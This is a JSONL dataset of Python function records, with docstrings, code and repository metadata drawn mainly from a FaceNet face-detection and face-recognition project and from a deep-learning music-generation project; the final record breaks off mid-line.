{"docstring": "\"\"\"Compute the padding coordinates (pad the bounding boxes to square)\"\"\"\n", "func_signal": "def pad(total_boxes, w, h):\n", "code": "tmpw = (total_boxes[:,2]-total_boxes[:,0]+1).astype(np.int32)\ntmph = (total_boxes[:,3]-total_boxes[:,1]+1).astype(np.int32)\nnumbox = total_boxes.shape[0]\n\ndx = np.ones((numbox), dtype=np.int32)\ndy = np.ones((numbox), dtype=np.int32)\nedx = tmpw.copy().astype(np.int32)\nedy = tmph.copy().astype(np.int32)\n\nx = total_boxes[:,0].copy().astype(np.int32)\ny = total_boxes[:,1].copy().astype(np.int32)\nex = total_boxes[:,2].copy().astype(np.int32)\ney = total_boxes[:,3].copy().astype(np.int32)\n\ntmp = np.where(ex>w)\nedx.flat[tmp] = np.expand_dims(-ex[tmp]+w+tmpw[tmp],1)\nex[tmp] = w\n\ntmp = np.where(ey>h)\nedy.flat[tmp] = np.expand_dims(-ey[tmp]+h+tmph[tmp],1)\ney[tmp] = h\n\ntmp = np.where(x<1)\ndx.flat[tmp] = np.expand_dims(2-x[tmp],1)\nx[tmp] = 1\n\ntmp = np.where(y<1)\ndy.flat[tmp] = np.expand_dims(2-y[tmp],1)\ny[tmp] = 1\n\nreturn dy, edy, dx, edx, y, ey, x, ex, tmpw, tmph", "path": "understand_facenet\\align\\detect_face.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Add summaries for losses.\n  \nGenerates moving average for all losses and associated summaries for\nvisualizing the performance of the network.\n  \nArgs:\n  total_loss: Total loss from loss().\nReturns:\n  loss_averages_op: op for generating moving averages of losses.\n\"\"\"\n# Compute the moving average of all individual losses and the total loss.\n", "func_signal": "def _add_loss_summaries(total_loss):\n", "code": "loss_averages = tf.train.ExponentialMovingAverage(0.9, name='avg')\nlosses = tf.get_collection('losses')\nloss_averages_op = loss_averages.apply(losses + [total_loss])\n  \n# Attach a scalar summmary to all individual losses and the total loss; do the\n# same for the averaged version of the losses.\nfor l in losses + [total_loss]:\n    # Name each loss as '(raw)' and name the moving average version of the loss\n    # as the original loss name.\n    tf.summary.scalar(l.op.name +' (raw)', l)\n    tf.summary.scalar(l.op.name, loss_averages.average(l))\n  \nreturn loss_averages_op", "path": "understand_facenet\\facenet.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Use heatmap to generate bounding boxes\"\"\"\n", "func_signal": "def generateBoundingBox(imap, reg, scale, t):\n", "code": "stride=2\ncellsize=12\n\nimap = np.transpose(imap)\ndx1 = np.transpose(reg[:,:,0])\ndy1 = np.transpose(reg[:,:,1])\ndx2 = np.transpose(reg[:,:,2])\ndy2 = np.transpose(reg[:,:,3])\ny, x = np.where(imap >= t)\nif y.shape[0]==1:\n    dx1 = np.flipud(dx1)\n    dy1 = np.flipud(dy1)\n    dx2 = np.flipud(dx2)\n    dy2 = np.flipud(dy2)\nscore = imap[(y,x)]\nreg = np.transpose(np.vstack([ dx1[(y,x)], dy1[(y,x)], dx2[(y,x)], dy2[(y,x)] ]))\nif reg.size==0:\n    reg = np.empty((0,3))\nbb = np.transpose(np.vstack([y,x]))\nq1 = np.fix((stride*bb+1)/scale)\nq2 = np.fix((stride*bb+cellsize-1+1)/scale)\nboundingbox = np.hstack([q1, q2, np.expand_dims(score,1), reg])\nreturn boundingbox, reg", "path": "understand_facenet\\align\\detect_face.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Decov loss as described in https://arxiv.org/pdf/1511.06068.pdf\n'Reducing Overfitting In Deep Networks by Decorrelating Representation'\n\"\"\"\n", "func_signal": "def decov_loss(xs):\n", "code": "x = tf.reshape(xs, [int(xs.get_shape()[0]), -1])\nm = tf.reduce_mean(x, 0, True)\nz = tf.expand_dims(x-m, 2)\ncorr = tf.reduce_mean(tf.matmul(z, tf.transpose(z, perm=[0,2,1])), 0)\ncorr_frob_sqr = tf.reduce_sum(tf.square(corr))\ncorr_diag_sqr = tf.reduce_sum(tf.square(tf.diag_part(corr)))\nloss = 0.5*(corr_frob_sqr - corr_diag_sqr)\nreturn loss", "path": "understand_facenet\\facenet.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Detects faces in an image, and returns bounding boxes and points for them.\nimg: input image\nminsize: minimum faces' size\npnet, rnet, onet: caffemodel\nthreshold: threshold=[th1, th2, th3], th1-3 are three steps's threshold\nfactor: the factor used to create a scaling pyramid of face sizes to detect in the image.\u7528\u4e8e\u521b\u5efa\u56fe\u50cf\u4e2d\u68c0\u6d4b\u5230\u7684\u9762\u90e8\u5c3a\u5bf8\u7684\u6bd4\u4f8b\u91d1\u5b57\u5854\u7684\u56e0\u7d20\n\"\"\"\n", "func_signal": "def detect_face(img, minsize, pnet, rnet, onet, threshold, factor):\n", "code": "factor_count=0\ntotal_boxes=np.empty((0,9))\npoints=np.empty(0)\nh=img.shape[0]\nw=img.shape[1]\nminl=np.amin([h, w])\nm=12.0/minsize\nminl=minl*m\n# create scale pyramid\nscales=[]\nwhile minl>=12:\n    scales += [m*np.power(factor, factor_count)]\n    minl = minl*factor\n    factor_count += 1\n\n# first stage\nfor scale in scales:\n    hs=int(np.ceil(h*scale))\n    ws=int(np.ceil(w*scale))\n    im_data = imresample(img, (hs, ws))\n    im_data = (im_data-127.5)*0.0078125\n    img_x = np.expand_dims(im_data, 0)\n    img_y = np.transpose(img_x, (0,2,1,3))\n    out = pnet(img_y)\n    out0 = np.transpose(out[0], (0,2,1,3))\n    out1 = np.transpose(out[1], (0,2,1,3))\n    \n    boxes, _ = generateBoundingBox(out1[0,:,:,1].copy(), out0[0,:,:,:].copy(), scale, threshold[0])\n    \n    # inter-scale nms\n    pick = nms(boxes.copy(), 0.5, 'Union')\n    if boxes.size>0 and pick.size>0:\n        boxes = boxes[pick,:]\n        total_boxes = np.append(total_boxes, boxes, axis=0)\n\nnumbox = total_boxes.shape[0]\nif numbox>0:\n    pick = nms(total_boxes.copy(), 0.7, 'Union')\n    total_boxes = total_boxes[pick,:]\n    regw = total_boxes[:,2]-total_boxes[:,0]\n    regh = total_boxes[:,3]-total_boxes[:,1]\n    qq1 = total_boxes[:,0]+total_boxes[:,5]*regw\n    qq2 = total_boxes[:,1]+total_boxes[:,6]*regh\n    qq3 = total_boxes[:,2]+total_boxes[:,7]*regw\n    qq4 = total_boxes[:,3]+total_boxes[:,8]*regh\n    total_boxes = np.transpose(np.vstack([qq1, qq2, qq3, qq4, total_boxes[:,4]]))\n    total_boxes = rerec(total_boxes.copy())\n    total_boxes[:,0:4] = np.fix(total_boxes[:,0:4]).astype(np.int32)\n    dy, edy, dx, edx, y, ey, x, ex, tmpw, tmph = pad(total_boxes.copy(), w, h)\n\nnumbox = total_boxes.shape[0]\nif numbox>0:\n    # second stage\n    tempimg = np.zeros((24,24,3,numbox))\n    for k in range(0,numbox):\n        tmp = np.zeros((int(tmph[k]),int(tmpw[k]),3))\n        tmp[dy[k]-1:edy[k],dx[k]-1:edx[k],:] = img[y[k]-1:ey[k],x[k]-1:ex[k],:]\n        if tmp.shape[0]>0 and tmp.shape[1]>0 or tmp.shape[0]==0 and tmp.shape[1]==0:\n            tempimg[:,:,:,k] = imresample(tmp, (24, 24))\n        else:\n            return np.empty()\n    tempimg = (tempimg-127.5)*0.0078125\n    tempimg1 = np.transpose(tempimg, (3,1,0,2))\n    out = rnet(tempimg1)\n    out0 = np.transpose(out[0])\n    out1 = np.transpose(out[1])\n    score = out1[1,:]\n    ipass = np.where(score>threshold[1])\n    total_boxes = np.hstack([total_boxes[ipass[0],0:4].copy(), np.expand_dims(score[ipass].copy(),1)])\n    mv = out0[:,ipass[0]]\n    if total_boxes.shape[0]>0:\n        pick = nms(total_boxes, 0.7, 'Union')\n        total_boxes = total_boxes[pick,:]\n        total_boxes = bbreg(total_boxes.copy(), np.transpose(mv[:,pick]))\n        total_boxes = rerec(total_boxes.copy())\n\nnumbox = total_boxes.shape[0]\nif numbox>0:\n    # third stage\n    total_boxes = np.fix(total_boxes).astype(np.int32)\n    dy, edy, dx, edx, y, ey, x, ex, tmpw, tmph = pad(total_boxes.copy(), w, h)\n    tempimg = np.zeros((48,48,3,numbox))\n    for k in range(0,numbox):\n        tmp = np.zeros((int(tmph[k]),int(tmpw[k]),3))\n        tmp[dy[k]-1:edy[k],dx[k]-1:edx[k],:] = img[y[k]-1:ey[k],x[k]-1:ex[k],:]\n        if tmp.shape[0]>0 and tmp.shape[1]>0 or tmp.shape[0]==0 and tmp.shape[1]==0:\n            tempimg[:,:,:,k] = imresample(tmp, (48, 48))\n        else:\n            return np.empty()\n    tempimg = (tempimg-127.5)*0.0078125\n    tempimg1 = np.transpose(tempimg, (3,1,0,2))\n    out = onet(tempimg1)\n    out0 = np.transpose(out[0])\n    out1 = np.transpose(out[1])\n    out2 = np.transpose(out[2])\n    score = out2[1,:]\n    points = out1\n    ipass = np.where(score>threshold[2])\n    points = points[:,ipass[0]]\n    total_boxes = np.hstack([total_boxes[ipass[0],0:4].copy(), np.expand_dims(score[ipass].copy(),1)])\n    mv = out0[:,ipass[0]]\n\n    w = total_boxes[:,2]-total_boxes[:,0]+1\n    h = total_boxes[:,3]-total_boxes[:,1]+1\n    points[0:5,:] = np.tile(w,(5, 1))*points[0:5,:] + np.tile(total_boxes[:,0],(5, 1))-1\n    points[5:10,:] = np.tile(h,(5, 1))*points[5:10,:] + np.tile(total_boxes[:,1],(5, 1))-1\n    if total_boxes.shape[0]>0:\n        total_boxes = bbreg(total_boxes.copy(), np.transpose(mv))\n        pick = nms(total_boxes.copy(), 0.7, 'Min')\n        total_boxes = total_boxes[pick,:]\n        points = points[:,pick]\n            \nreturn total_boxes, points   # total_boxes\uff1a\u5e94\u8be5\u662f\u4eba\u8138\u7684\u4e2a\u6570, points\uff1a\u4e2d\u5fc3\u70b9\u7684\u4f4d\u7f6e\uff1f", "path": "understand_facenet\\align\\detect_face.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Builds the 8x8 resnet block.\"\"\"\n", "func_signal": "def block8(net, scale=1.0, activation_fn=tf.nn.relu, scope=None, reuse=None):\n", "code": "with tf.variable_scope(scope, 'Block8', [net], reuse=reuse):\n    with tf.variable_scope('Branch_0'):\n        tower_conv = slim.conv2d(net, 192, 1, scope='Conv2d_1x1')\n    with tf.variable_scope('Branch_1'):\n        tower_conv1_0 = slim.conv2d(net, 192, 1, scope='Conv2d_0a_1x1')\n        tower_conv1_1 = slim.conv2d(tower_conv1_0, 224, [1, 3],\n                                    scope='Conv2d_0b_1x3')\n        tower_conv1_2 = slim.conv2d(tower_conv1_1, 256, [3, 1],\n                                    scope='Conv2d_0c_3x1')\n    mixed = tf.concat([tower_conv, tower_conv1_2], 3)\n    up = slim.conv2d(mixed, net.get_shape()[3], 1, normalizer_fn=None,\n                     activation_fn=None, scope='Conv2d_1x1')\n    net += scale * up\n    if activation_fn:\n        net = activation_fn(net)\nreturn net", "path": "understand_facenet\\models\\inception_resnet_v2.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Calibrate bounding boxes\"\"\"\n", "func_signal": "def bbreg(boundingbox,reg):\n", "code": "if reg.shape[1]==1:\n    reg = np.reshape(reg, (reg.shape[2], reg.shape[3]))\n\nw = boundingbox[:,2]-boundingbox[:,0]+1\nh = boundingbox[:,3]-boundingbox[:,1]+1\nb1 = boundingbox[:,0]+reg[:,0]*w\nb2 = boundingbox[:,1]+reg[:,1]*h\nb3 = boundingbox[:,2]+reg[:,2]*w\nb4 = boundingbox[:,3]+reg[:,3]*h\nboundingbox[:,0:4] = np.transpose(np.vstack([b1, b2, b3, b4 ]))\nreturn boundingbox", "path": "understand_facenet\\align\\detect_face.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "# Check if the model is a model directory (containing a metagraph and a checkpoint file)\n#  or if it is a protobuf file with a frozen graph\n", "func_signal": "def load_model(model):\n", "code": "model_exp = os.path.expanduser(model)\nif (os.path.isfile(model_exp)):\n    print('Model filename: %s' % model_exp)\n    with gfile.FastGFile(model_exp,'rb') as f:\n        graph_def = tf.GraphDef()\n        graph_def.ParseFromString(f.read())\n        tf.import_graph_def(graph_def, name='')\nelse:\n    print('Model directory: %s' % model_exp)\n    meta_file, ckpt_file = get_model_filenames(model_exp)\n    \n    print('Metagraph file: %s' % meta_file)\n    print('Checkpoint file: %s' % ckpt_file)\n  \n    saver = tf.train.import_meta_graph(os.path.join(model_exp, meta_file))\n    saver.restore(tf.get_default_session(), os.path.join(model_exp, ckpt_file))", "path": "understand_facenet\\facenet.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "# Generate moving averages of all losses and associated summaries.\n", "func_signal": "def train(total_loss, global_step, optimizer, learning_rate, moving_average_decay, update_gradient_vars, log_histograms=True):\n", "code": "loss_averages_op = _add_loss_summaries(total_loss)\n\n# Compute gradients.\nwith tf.control_dependencies([loss_averages_op]):\n    if optimizer=='ADAGRAD':\n        opt = tf.train.AdagradOptimizer(learning_rate)\n    elif optimizer=='ADADELTA':\n        opt = tf.train.AdadeltaOptimizer(learning_rate, rho=0.9, epsilon=1e-6)\n    elif optimizer=='ADAM':\n        opt = tf.train.AdamOptimizer(learning_rate, beta1=0.9, beta2=0.999, epsilon=0.1)\n    elif optimizer=='RMSPROP':\n        opt = tf.train.RMSPropOptimizer(learning_rate, decay=0.9, momentum=0.9, epsilon=1.0)\n    elif optimizer=='MOM':\n        opt = tf.train.MomentumOptimizer(learning_rate, 0.9, use_nesterov=True)\n    else:\n        raise ValueError('Invalid optimization algorithm')\n\n    grads = opt.compute_gradients(total_loss, update_gradient_vars)\n    \n# Apply gradients.\napply_gradient_op = opt.apply_gradients(grads, global_step=global_step)\n  \n# Add histograms for trainable variables.\nif log_histograms:\n    for var in tf.trainable_variables():\n        tf.summary.histogram(var.op.name, var)\n   \n# Add histograms for gradients.\nif log_histograms:\n    for grad, var in grads:\n        if grad is not None:\n            tf.summary.histogram(var.op.name + '/gradients', grad)\n  \n# Track the moving averages of all trainable variables.\nvariable_averages = tf.train.ExponentialMovingAverage(\n    moving_average_decay, global_step)\nvariables_averages_op = variable_averages.apply(tf.trainable_variables())\n  \nwith tf.control_dependencies([apply_gradient_op, variables_averages_op]):\n    train_op = tf.no_op(name='train')\n  \nreturn train_op", "path": "understand_facenet\\facenet.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "# The input nodes for this network\n", "func_signal": "def __init__(self, inputs, trainable=True):\n", "code": "self.inputs = inputs\n# The current list of terminal nodes\nself.terminals = []\n# Mapping from layer names to layers\nself.layers = dict(inputs)\n# If true, the resulting variables are set as trainable\nself.trainable = trainable\n\nself.setup()", "path": "understand_facenet\\align\\detect_face.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Center loss based on the paper \"A Discriminative Feature Learning Approach for Deep Face Recognition\"\n   (http://ydwen.github.io/papers/WenECCV16.pdf)\n\"\"\"\n", "func_signal": "def center_loss(features, label, alfa, nrof_classes):\n", "code": "nrof_features = features.get_shape()[1]\ncenters = tf.get_variable('centers', [nrof_classes, nrof_features], dtype=tf.float32,\n    initializer=tf.constant_initializer(0), trainable=False)\nlabel = tf.reshape(label, [-1])\ncenters_batch = tf.gather(centers, label)\ndiff = (1 - alfa) * (centers_batch - features)\ncenters = tf.scatter_sub(centers, label, diff)\nloss = tf.reduce_mean(tf.square(features - centers_batch))\nreturn loss, centers", "path": "understand_facenet\\facenet.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Calculate the triplet loss according to the FaceNet paper\nArgs:\n  anchor: the embeddings for the anchor images.\n  positive: the embeddings for the positive images.\n  negative: the embeddings for the negative images.\n  \nReturns:\n  the triplet loss according to the FaceNet paper as a float tensor.\n\"\"\"\n", "func_signal": "def triplet_loss(anchor, positive, negative, alpha):\n", "code": "with tf.variable_scope('triplet_loss'):\n    pos_dist = tf.reduce_sum(tf.square(tf.subtract(anchor, positive)), 1)#tf.square:\u5e73\u65b9\u3002tf.subtract::\u51cf\u6cd5\n    neg_dist = tf.reduce_sum(tf.square(tf.subtract(anchor, negative)), 1)\n    \n    basic_loss = tf.add(tf.subtract(pos_dist,neg_dist), alpha)\n    loss = tf.reduce_mean(tf.maximum(basic_loss, 0.0), 0)\n  \nreturn loss", "path": "understand_facenet\\facenet.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Builds the 35x35 resnet block.\"\"\"\n", "func_signal": "def block35(net, scale=1.0, activation_fn=tf.nn.relu, scope=None, reuse=None):\n", "code": "with tf.variable_scope(scope, 'Block35', [net], reuse=reuse):\n    with tf.variable_scope('Branch_0'):\n        tower_conv = slim.conv2d(net, 32, 1, scope='Conv2d_1x1')\n    with tf.variable_scope('Branch_1'):\n        tower_conv1_0 = slim.conv2d(net, 32, 1, scope='Conv2d_0a_1x1')\n        tower_conv1_1 = slim.conv2d(tower_conv1_0, 32, 3, scope='Conv2d_0b_3x3')\n    with tf.variable_scope('Branch_2'):\n        tower_conv2_0 = slim.conv2d(net, 32, 1, scope='Conv2d_0a_1x1')\n        tower_conv2_1 = slim.conv2d(tower_conv2_0, 48, 3, scope='Conv2d_0b_3x3')\n        tower_conv2_2 = slim.conv2d(tower_conv2_1, 64, 3, scope='Conv2d_0c_3x3')\n    mixed = tf.concat([tower_conv, tower_conv1_1, tower_conv2_2], 3)\n    up = slim.conv2d(mixed, net.get_shape()[3], 1, normalizer_fn=None,\n                     activation_fn=None, scope='Conv2d_1x1')\n    net += scale * up\n    if activation_fn:\n        net = activation_fn(net)\nreturn net", "path": "understand_facenet\\models\\inception_resnet_v2.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Load network weights.\ndata_path: The path to the numpy-serialized network weights\nsession: The current TensorFlow session\nignore_missing: If true, serialized weights for missing layers are ignored.\n\"\"\"\n", "func_signal": "def load(self, data_path, session, ignore_missing=False):\n", "code": "data_dict = np.load(data_path, encoding='latin1').item() #pylint: disable=no-member\n\nfor op_name in data_dict:\n    with tf.variable_scope(op_name, reuse=True):\n        for param_name, data in iteritems(data_dict[op_name]):\n            try:\n                var = tf.get_variable(param_name)\n                session.run(var.assign(data))\n            except ValueError:\n                if not ignore_missing:\n                    raise", "path": "understand_facenet\\align\\detect_face.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Returns an index-suffixed unique name for the given prefix.\nThis is used for auto-generating layer names based on the type-prefix.\n\"\"\"\n", "func_signal": "def get_unique_name(self, prefix):\n", "code": "ident = sum(t.startswith(prefix) for t, _ in self.layers.items()) + 1\nreturn '%s_%d' % (prefix, ident)", "path": "understand_facenet\\align\\detect_face.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Consumes a single filename and label as a ' '-delimited string.\nArgs:\n  filename_and_label_tensor: A scalar string tensor.\nReturns:\n  Two tensors: the decoded image, and the string label.\n\"\"\"\n", "func_signal": "def read_images_from_disk(input_queue):\n", "code": "label = input_queue[1]\nfile_contents = tf.read_file(input_queue[0])\nexample = tf.image.decode_image(file_contents, channels=3)\nreturn example, label", "path": "understand_facenet\\facenet.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Builds the 17x17 resnet block.\"\"\"\n", "func_signal": "def block17(net, scale=1.0, activation_fn=tf.nn.relu, scope=None, reuse=None):\n", "code": "with tf.variable_scope(scope, 'Block17', [net], reuse=reuse):\n    with tf.variable_scope('Branch_0'):\n        tower_conv = slim.conv2d(net, 192, 1, scope='Conv2d_1x1')\n    with tf.variable_scope('Branch_1'):\n        tower_conv1_0 = slim.conv2d(net, 128, 1, scope='Conv2d_0a_1x1')\n        tower_conv1_1 = slim.conv2d(tower_conv1_0, 160, [1, 7],\n                                    scope='Conv2d_0b_1x7')\n        tower_conv1_2 = slim.conv2d(tower_conv1_1, 192, [7, 1],\n                                    scope='Conv2d_0c_7x1')\n    mixed = tf.concat([tower_conv, tower_conv1_2], 3)\n    up = slim.conv2d(mixed, net.get_shape()[3], 1, normalizer_fn=None,\n                     activation_fn=None, scope='Conv2d_1x1')\n    net += scale * up\n    if activation_fn:\n        net = activation_fn(net)\nreturn net", "path": "understand_facenet\\models\\inception_resnet_v2.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Decorator for composable network layers.\"\"\"\n\n", "func_signal": "def layer(op):\n", "code": "def layer_decorated(self, *args, **kwargs):\n    # Automatically set a name if not provided.\n    name = kwargs.setdefault('name', self.get_unique_name(op.__name__))\n    # Figure out the layer inputs.\n    if len(self.terminals) == 0:\n        raise RuntimeError('No input variables found for layer %s.' % name)\n    elif len(self.terminals) == 1:\n        layer_input = self.terminals[0]\n    else:\n        layer_input = list(self.terminals)\n    # Perform the operation and get the output.\n    layer_output = op(self, layer_input, *args, **kwargs)\n    # Add to layer LUT.\n    self.layers[name] = layer_output\n    # This output is now the input for the next layer.\n    self.feed(layer_output)\n    # Return self for chained calls.\n    return self\n\nreturn layer_decorated", "path": "understand_facenet\\align\\detect_face.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\" Save the song on disk\nArgs:\n    piano_roll (np.array): a song object containing the tracks and melody\n    filename (str): the path were to save the song (don't add the file extension)\n\"\"\"\n", "func_signal": "def write_song(piano_roll, filename):\n", "code": "note_played = piano_roll > 0.5\npiano_roll_int = np.uint8(piano_roll*255)\n\nb = piano_roll_int * (~note_played).astype(np.uint8)  # Note silenced\ng = np.zeros(piano_roll_int.shape, dtype=np.uint8)    # Empty channel\nr = piano_roll_int * note_played.astype(np.uint8)     # Notes played\n\nimg = cv.merge((b, g, r))\n\n# TODO: We could insert a first column indicating the piano keys (black/white key)\n\ncv.imwrite(filename + '.png', img)", "path": "deepmusic\\imgconnector.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Return RNN cell, constructed from the parameters\nArgs:\n    args: the rnn parameters\n    scope_name (str): encapsulate variables\nReturn:\n    tf.RNNCell: a cell\n\"\"\"\n", "func_signal": "def get_rnn_cell(args, scope_name):\n", "code": "with tf.variable_scope('weights_' + scope_name):\n    rnn_cell = tf.nn.rnn_cell.BasicLSTMCell(args.hidden_size, state_is_tuple=True)  # Or GRUCell, LSTMCell(args.hidden_size)\n    #rnn_cell = tf.nn.rnn_cell.DropoutWrapper(rnn_cell, input_keep_prob=1.0, output_keep_prob=1.0)  # TODO: Custom values (WARNING: No dropout when testing !!!, possible to use placeholder ?)\n    rnn_cell = tf.nn.rnn_cell.MultiRNNCell([rnn_cell] * args.num_layers, state_is_tuple=True)\nreturn rnn_cell", "path": "deepmusic\\tfutils.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\"Load/create the conversations data\nDone in two steps:\n * Extract the midi files as a raw song format\n * Transform this raw song as neural networks compatible input\n\"\"\"\n\n# Construct the dataset names\n", "func_signal": "def _restore_dataset(self):\n", "code": "samples_path_generic = os.path.join(\n    self.args.root_dir,\n    self.DATA_DIR_SAMPLES,\n    self.args.dataset_tag + '-{}' + self.DATA_SAMPLES_EXT\n)\nsamples_path_raw = samples_path_generic.format(self.DATA_SAMPLES_RAW)\nsamples_path_preprocessed = samples_path_generic.format(ModuleLoader.batch_builders.get_chosen_name())\n\n# TODO: the _restore_samples from the raw songs and precomputed database should have different versions number\n\n# Restoring precomputed database\nif os.path.exists(samples_path_preprocessed):\n    print('Restoring dataset from {}...'.format(samples_path_preprocessed))\n    self._restore_samples(samples_path_preprocessed)\n\n# First time we load the database: creating all files\nelse:\n    print('Training samples not found. Creating dataset from the songs...')\n    # Restoring raw songs\n    if os.path.exists(samples_path_raw):\n        print('Restoring songs from {}...'.format(samples_path_raw))\n        self._restore_samples(samples_path_raw)\n\n    # First time we load the database: creating all files\n    else:\n        print('Raw songs not found. Extracting from midi files...')\n        self._create_raw_songs()\n        print('Saving raw songs...')\n        self._save_samples(samples_path_raw)\n\n    # At this point, self.songs contain the list of the raw songs. Each\n    # song is then preprocessed by the batch builder\n\n    # Generating the data from the raw songs\n    print('Pre-processing songs...')\n    for i, song in tqdm(enumerate(self.songs), total=len(self.songs)):\n        self.songs[i] = self.batch_builder.process_song(song)\n\n    print('Saving dataset...')\n    np.random.shuffle(self.songs)  # Important to do that before saving so the train/test set will be fixed each time we reload the dataset\n    self._save_samples(samples_path_preprocessed)", "path": "deepmusic\\musicdata.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\"\nArgs:\n    args: parameters of the model\n\"\"\"\n", "func_signal": "def __init__(self, args):\n", "code": "print('Model creation...')\n\nself.args = args  # Keep track of the parameters of the model\n\n# Placeholders\nself.inputs = None\nself.targets = None\nself.use_prev = None  # Boolean tensor which say at Graph evaluation time if we use the input placeholder or the previous output.\nself.current_learning_rate = None  # Allow to have a dynamic learning rate\n\n# Main operators\nself.opt_op = None  # Optimizer\nself.outputs = None  # Outputs of the network\nself.final_state = None  # When testing, we feed this value as initial state ?\n\n# Other options\nself.target_weights_policy = None\nself.schedule_policy = None\nself.learning_rate_policy = None\n\n# Construct the graphs\nself._build_network()", "path": "deepmusic\\model_old.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\"\nArgs:\n    args: parameters of the model\n\"\"\"\n", "func_signal": "def __init__(self, args):\n", "code": "print('Model creation...')\n\nself.args = args  # Keep track of the parameters of the model\n\n# Placeholders\nself.inputs = None\nself.targets = None\nself.use_prev = None  # Boolean tensor which say at Graph evaluation time if we use the input placeholder or the previous output.\nself.current_learning_rate = None  # Allow to have a dynamic learning rate\n\n# Main operators\nself.opt_op = None  # Optimizer\nself.outputs = None  # Outputs of the network\nself.final_state = None  # When testing, we feed this value as initial state ?\n\n# Other options\nself.target_weights_policy = None\nself.schedule_policy = None\nself.learning_rate_policy = None\nself.loop_processing = None\n\n# Construct the graphs\nself._build_network()", "path": "deepmusic\\model.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Convert a given song to a numpy multi-dimensional array (piano roll)\nThe song is temporally normalized, meaning that all ticks and duration will be converted to a specific\nticks_per_beat independent unit.\nFor now, the changes of tempo are ignored. Only 4/4 is supported.\nWarning: The duration is ignored: All note have the same duration (1 unit)\nArgs:\n    song (Song): The song to convert\nReturn:\n    Array: the numpy array: a binary matrix of shape [NB_NOTES, song_length]\n\"\"\"\n\n# Convert the absolute ticks in standardized unit\n", "func_signal": "def _convert_song2array(self, song):\n", "code": "song_length = len(song)\nscale = self._get_scale(song)\n\n# TODO: Not sure why this plot a decimal value (x.66). Investigate...\n# print(song_length/scale)\n\n# Use sparse array instead ?\npiano_roll = np.zeros([music.NB_NOTES, int(np.ceil(song_length/scale))], dtype=int)\n\n# Adding all notes\nfor track in song.tracks:\n    for note in track.notes:\n        piano_roll[note.get_relative_note()][note.tick//scale] = 1\n\nreturn piano_roll", "path": "deepmusic\\musicdata.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Forward/training step operation.\nDoes not perform run on itself but just return the operators to do so. Those have then to be run by the\nmain program.\nIf the output operator is returned, it will always be the last one on the list\nArgs:\n    batch (Batch): Input data on testing mode, input and target on output mode\n    train_set (Bool): indicate if the batch come from the test/train set\n    glob_step (int): indicate the global step for the schedule sampling\n    ret_output (Bool): for the training mode, if true,\nReturn:\n    Tuple[ops], dict: The list of the operators to run (training_step or outputs) with the associated feed dictionary\n\"\"\"\n# TODO: Could optimize feeding between train/test/generating (compress code)\n\n# Feed the dictionary\n", "func_signal": "def step(self, batch, train_set=True, glob_step=-1, ret_output=False):\n", "code": "feed_dict = {}\nops = ()  # For small length, it seems (from my investigations) that tuples are faster than list for merging\n\n# Feed placeholders and choose the ops\nif not self.args.test:  # Training\n    if train_set:\n        assert glob_step >= 0\n        feed_dict[self.current_learning_rate] = self.learning_rate_policy.get_learning_rate(glob_step)\n\n    for i in range(self.args.sample_length):\n        feed_dict[self.inputs[i]] = batch.inputs[i]\n        feed_dict[self.targets[i]] = batch.targets[i]\n        #if not train_set or np.random.rand() > self.schedule_policy.get_prev_threshold(glob_step)*self.target_weights_policy.get_weight(i):  # Regular Schedule sample (TODO: Try sampling with the weigths or a mix of weights/sampling)\n        if np.random.rand() > self.schedule_policy.get_prev_threshold(glob_step):  # Weight the threshold by the target weights (don't schedule sample if weight=0)\n            feed_dict[self.use_prev[i]] = True\n        else:\n            feed_dict[self.use_prev[i]] = False\n\n    if train_set:\n        ops += 